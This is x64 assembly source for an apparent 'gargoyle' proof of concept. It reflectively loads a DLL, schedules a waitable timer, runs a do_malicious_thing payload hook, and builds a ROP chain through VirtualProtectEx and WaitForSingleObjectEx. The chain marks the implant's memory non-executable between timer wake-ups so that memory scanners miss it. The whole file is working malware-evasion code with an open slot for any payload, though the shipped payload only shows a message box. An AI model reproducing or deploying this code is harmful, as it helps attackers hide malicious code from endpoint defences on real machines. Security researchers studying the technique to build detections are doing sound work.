struc Config
  .initialized                 resb 8
  .pop_rcx_pop_rsp_ret         resb 8
  .pop_rcx_ret                 resb 8
  .pop_rdx_ret                 resb 8
  .pop_r8_ret                  resb 8
  .add_rsp_30_ret              resb 8
  .VirtualProtectEx_ptr        resb 8
  .WaitForSingleObjectEx_ptr   resb 8
  .timer_period                resb 8
  .base_ptr                    resb 8
  .dll_size                    resb 8
  .timer_handle                resb 8
  .dump                        resb 8
  .tramp_copy                  resb 160 ; change this if struct in gargoyle.h is changed
  .stack                       resb 0x80000
  .tramp                       resb 160
endstruc

struc Tramp
  .pop_rcx_ret          resb 8
  .proc_handle          resb 8
  .pop_rdx_ret          resb 8
  .addr                 resb 8 
  .pop_r8_ret           resb 8
  .size                 resb 8
  .pop_r9_ret           resb 8
  .new_protection       resb 8
  .VirtualProtectEx_ptr resb 8
  .add_rsp_30_ret       resb 8
  .shadow_space1        resb 8
  .shadow_space2        resb 8
  .shadow_space3        resb 8
  .shadow_space4        resb 8
  .old_protection_ptr   resb 8
  .padding              resb 8
  .pop_rcx_ret_ptr2     resb 8
  .gargoyle_arg_ptr     resb 8
  .gargoyle_addr        resb 8
endstruc

extern do_load
extern call_dll_main
extern do_malicious_thing
extern CreateWaitableTimerW
extern SetWaitableTimer
extern WaitForSingleObjectEx
extern VirtualProtectEx

global gargoyle
export gargoyle

; what we do is this:
; if not initialized, create and set timer, then call do_load(), which does reflective loading
; call DllMain()
; call do_malicious_thing()
; call VirtualProtectEx(), setting gargoyle back to RW
; tail call to WaitForSingleObjectEx() twice, making the thread alertable
gargoyle:

  mov rbx, rcx ; configuration in rbx
  lea rsp, [rbx + Config.tramp-8] ;bottom of stack
  mov rbp, rsp

  mov rdx, [rbx + Config.initialized]
  cmp rdx, 0

  jne reset_tramp

  mov [rbx + Config.tramp_copy + Tramp.gargoyle_arg_ptr], rbx ; initial call is by CRT, but for future calls we come through trampoline which does not initially have gargoyle arg ptr, so we put it in the backup now

  sub rsp, 0x20
  call do_load ; reflectively load DLL
  add rsp, 0x20

  ; now we setup timer

  mov rcx, 0
  mov rdx, 0
  mov r8, 0
  sub rsp, 0x20
  call CreateWaitableTimerW
  add rsp, 0x20

  mov [rbx + Config.timer_handle], rax ; save timer handle for WaitForSingleObjectEx

  mov rcx, rax ; timer handle
  lea rdx, [rbx + Config.dump] ; expiry ptr
  mov r8, [rbx + Config.timer_period] ; period
  mov r9, [rbx + Config.pop_rcx_pop_rsp_ret] ; completion routine
  push 0 ; resume
  lea rax, [rbx + Config.tramp] ; arg to completion routine
  push rax
  sub rsp, 0x20
  call SetWaitableTimer
  add rsp, 0x30

  mov rax, 1
  mov [rbx + Config.initialized], rax
  
  ; we need to make sure we call dllmain so that the CRT gets initialized
  mov rcx, [rbx + Config.base_ptr] ; load base ptr into rcx
  sub rsp, 0x20
  ;call call_dll_main ; call dll main
  add rsp, 0x20


  reset_tramp:

  mov rax, 160
  lea rsi, [rbx + Config.tramp_copy]
  lea rdi, [rbx + Config.tramp]
  
  ; now we copy tramp_copy back to tramp, in case we trashed it during rop
  copy_loop:
    mov cl, [rsi]
    inc rsi
    mov [rdi], cl
    inc rdi

    dec rax
    cmp rax, 0
    jne copy_loop


  ; now we call our do_malicious_thing function
  ; that could do anything (it pops a message box in this poc)

  sub rsp, 0x20
  call do_malicious_thing
  add rsp, 0x20

  ; now we do this:
  ; we have to VirtualProtectEx back to R,
  ; but after we do that we have to call WaitForSingleObjectEx * 2
  ; so we become alertable and the timer will wake us up
  ; but after we become read only we can no longer execute our code, so we
  ; do something similar to the stack trampoline and set up some rop to call WaitForSingleObjectEx
  ; So stack should look like the following just after jmp to VirtualProtectEx
  ; 
  ; TOP OF STACK
  ; add rsp, 0x30 + ret rop gadget (removes shadow space + params)
  ; shadow_space1
  ; shadow_space2
  ; shadow_space3
  ; shadow_space4
  ; 5th param of VirtualProtectEx (lpflOldProtect)
  ; padding
  ;
  ; pop rcx + ret rop gadget
  ; param1 of WaitForSingleObjectEx (timer handle)
  ; pop rdx + ret rop gadget
  ; param2 of WaitForSingleObjectEx (timer period)
  ; pop r8 + ret rop gadget
  ; param3 of WaitForSingleObjectEx (alertable)
  ; addr of WaitForSingleObjectEx
  ; add rsp, 0x30 + ret rop gadget (removes shadow space) 
  ; shadow_space1 (we only need 0x20 bytes of shadow space
  ; shadow_space2  but i could only find a rop gadget for
  ; shadow_space3  add rsp, 0x30)
  ; shadow_space4
  ; shadow_space5
  ; shadow_space6
  ;
  ; pop rcx + ret rop gadget
  ; param1 of WaitForSingleObjectEx (timer handle)
  ; pop rdx + ret rop gadget
  ; param2 of WaitForSingleObjectEx (timer period)
  ; pop r8 + ret rop gadget
  ; param3 of WaitForSingleObjectEx (alertable)
  ; addr of WaitForSingleObjectEx
  ; ret address placeholder
  ; shadow_space1 
  ; shadow_space2 
  ; shadow_space3 
  ; shadow_space4

  ; Tail call for WaitForSingleObjectEx * 1
  sub rsp, 0x28
  mov rax, [rbx + Config.WaitForSingleObjectEx_ptr]
  push rax

  push 1 ; param 3 (alertable)

  mov rax, [rbx + Config.pop_r8_ret]
  push rax

  mov rax, 0xffffffff
  push rax ; param 2 (time to wait)

  mov rax, [rbx + Config.pop_rdx_ret]
  push rax

  mov rax, [rbx + Config.timer_handle]
  push rax ; param 1 (timer handle)

  mov rax, [rbx + Config.pop_rcx_ret]
  push rax

  ; Tail call for WaitForSingleObjectEx * 2
  sub rsp, 0x30

  mov rax, [rbx + Config.add_rsp_30_ret]
  push rax

  mov rax, [rbx + Config.WaitForSingleObjectEx_ptr]
  push rax

  push 1 ; param 3 (alertable)

  mov rax, [rbx + Config.pop_r8_ret]
  push rax

  mov rax, 0xffffffff
  push rax ; param 2 (time to wait)

  mov rax, [rbx + Config.pop_rdx_ret]
  push rax

  mov rax, [rbx + Config.timer_handle]
  push rax ; param 1 (timer handle)

  mov rax, [rbx + Config.pop_rcx_ret]
  push rax

  ; now we call VirtualProtectEx
  sub rsp, 0x30
  mov rcx, 0xFFFFFFFFFFFFFFFF ; -1

  mov rdx, [rbx + Config.base_ptr]

  mov r8, [rbx + Config.dll_size]

  mov r9, 4 ; read-write

  lea rax, [rbx + Config.dump] ; param 5
  mov [rsp+0x20], rax
  
  mov rax, [rbx + Config.add_rsp_30_ret]
  push rax

  mov rax, [rbx + Config.VirtualProtectEx_ptr]
  jmp rax
